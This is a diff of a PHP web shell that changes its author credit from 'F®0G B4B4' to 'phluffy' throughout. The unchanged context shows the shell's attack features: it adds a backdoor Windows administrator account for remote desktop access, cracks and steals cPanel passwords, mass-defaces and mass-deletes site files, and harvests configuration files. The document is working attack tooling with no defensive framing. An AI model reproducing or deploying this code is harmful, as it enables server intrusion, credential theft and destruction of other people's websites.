@@ -702,7 +702,7 @@ function tools($toolsname, $args = null) {
         if(!is_writable(path())) die(color(1, 1, "Directory '".path()."' is not writeable. Can't create directory 'idx_config'."));
         if(!is_dir(path()."/idx_config/")) {
             @mkdir('idx_config', 0755);
-            $htaccess = "Options all\nDirectoryIndex F®0G B4B4.htm\nSatisfy Any";
+            $htaccess = "Options all\nDirectoryIndex luf.htm\nSatisfy Any";
             save("idx_config/.htaccess","w", $htaccess);
             foreach(getuser() as $user) {
                 $user_docroot = "/home/$user/public_html/";
@@ -966,16 +966,16 @@ function tools($toolsname, $args = null) {
     elseif($toolsname === "krdp") {
         $args = explode(" ", $args);
         if(OS() !== "Windows") die(color(1, 1, "Just For Windows Server"));
-        if(preg_match("/F®0G B4B4/", exe("net user"))) die(color(1, 1, "[INFO] username 'F®0G B4B4' already exists."));
-        $add_user   = exe("net user F®0G B4B4 F®0G B4B4 /add");
-        $add_groups1 = exe("net localgroup Administrators F®0G B4B4 /add");
-        $add_groups2 = exe("net localgroup Administrator F®0G B4B4 /add");
-        $add_groups3 = exe("net localgroup Administrateur F®0G B4B4 /add");
+        if(preg_match("/phluffy/", exe("net user"))) die(color(1, 1, "[INFO] username 'phluffy' already exists."));
+        $add_user   = exe("net user phluffy phluffy /add");
+        $add_groups1 = exe("net localgroup Administrators phluffy /add");
+        $add_groups2 = exe("net localgroup Administrator phluffy /add");
+        $add_groups3 = exe("net localgroup Administrateur phluffy /add");
         print "[ RDP ACCOUNT INFO ]<br>
         ------------------------------<br>
         IP: ".color(1, 2, $GLOBALS['SERVERIP'])."<br>
-        Username: ".color(1, 2, "F®0G B4B4")."<br>
-        Password: ".color(1, 2, "F®0G B4B4")."<br>
+        Username: ".color(1, 2, "phluffy")."<br>
+        Password: ".color(1, 2, "phluffy")."<br>
         ------------------------------<br><br>
         [ STATUS ]<br>
         ------------------------------<br>
@@ -1089,7 +1089,7 @@ function files_and_folder() {
         print "</tr>";
     }
     print "</table>";
-    print "<center>Copyright &copy; ".date("Y")." - <a href='https://www.facebook.com/username.le.kamla.dis/' target='_blank'>".color(1, 2, "F®0G B4B4")."</a></center>";
+    print "<center>Copyright &copy; ".date("Y")." - <a href='https://www.facebook.com/lulz.luffy/' target='_blank'>".color(1, 2, "phluffy")."</a></center>";
 }
 function action() {
     tools("upload");
@@ -1168,7 +1168,7 @@ function action() {
             else {
                 print "<center><form method='post' action='?do=zoneh&dir=".path()."'>
                        Defacer: <br>
-                       <input type='text' name='nick' size='50' value='F®0G B4B4'><br><br>
+                       <input type='text' name='nick' size='50' value='phluffy'><br><br>
                        Domains: <br>
                        <textarea style='width: 450px; height: 150px;' name='url' placeholder='http://google.com/'></textarea><br>
                        <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px;' type='submit' name='submit' value='Submit'>
@@ -1211,7 +1211,7 @@ function action() {
                         }
                     }
                 }
-                print ($i === 0) ? "" : "<p>".color(1, 3, "Sukses nyolong $i Cpanel by F®0G B4B4")."</p>";
+                print ($i === 0) ? "" : "<p>".color(1, 3, "Success $i Cpanel by phluffy")."</p>";
             } else {
                 print "<center>
                        <span>NB: CPanel Crack ini sudah auto get password ( pake db password ) maka akan work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
@@ -1496,8 +1496,8 @@ function action() {
                 <input type='radio' name='config_type' value='dir' checked>DIR Config<input type='radio' name='config_type' value='link'>LINK Config<br>
                 <input type='text' size='50' name='config_dir' value='".path()."'><br><br>
                 Set User & Pass: <br>
-                <input type='text' name='user_baru' value='F®0G B4B4' placeholder='user_baru'><br>
-                <input type='text' name='pass_baru' value='F®0G B4B4' placeholder='pass_baru'><br>
+                <input type='text' name='user_baru' value='ph.luffy' placeholder='user_baru'><br>
+                <input type='text' name='pass_baru' value='ph.luffy' placeholder='pass_baru'><br>
                 <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 215px; margin: 5px auto;' type='submit' name='hajar' value='Hajar!'>
                 </form></center>";
             }
@@ -1522,7 +1522,7 @@ function action() {
             } 
             else {
                 print "<center><form method='post'>
-                       <font style='text-decoration: underline;'>_F®0G B4B4_:</font><br>
+                       <font style='text-decoration: underline;'>_ph.luffy_:</font><br>
                        <input type='radio' name='mass_type' value='singledir' checked>Mass Deface Single Directory<input type='radio' name='mass_type' value='alldir'>Mass Deface All Directory<input type='radio' name='mass_type' value='delete'>Mass Delete File<br>
                        <span>( kosongkan 'Index File' jika memilih Mass Delete File )</span><br><br>
                        <font style='text-decoration: underline;'>Folder:</font><br>
@@ -1530,7 +1530,7 @@ function action() {
                        <font style='text-decoration: underline;'>Filename:</font><br>
                        <input type='text' name='d_file' value='index.php' style='width: 450px;' height='10'><br><br>
                        <font style='text-decoration: underline;'>Index File:</font><br>
-                       <textarea name='script' style='width: 450px; height: 200px;'>Hacked by F®0G B4B4</textarea><br>
+                       <textarea name='script' style='width: 450px; height: 200px;'>Hacked by ph.luffy</textarea><br>
                        <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='start' value='Mass'>
                        </form></center>";
             }
@@ -1563,7 +1563,7 @@ function action() {
                 print implode("\n", reverse());
                 print "</textarea><br>
                 <font style='text-decoration: underline;'>Index File:</font><br>
-                <textarea name='script' style='width: 450px; height: 200px;'>Hacked by F®0G B4B4</textarea><br>
+                <textarea name='script' style='width: 450px; height: 200px;'>Hacked by ph.luffy</textarea><br>
                 <input style='background: transparent; color: #ffffff; border: 1px solid #ffffff; width: 460px; margin: 5px auto;' type='submit' name='reverse' value='Scan Fake Root!'>
                 </form><br>
                 NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
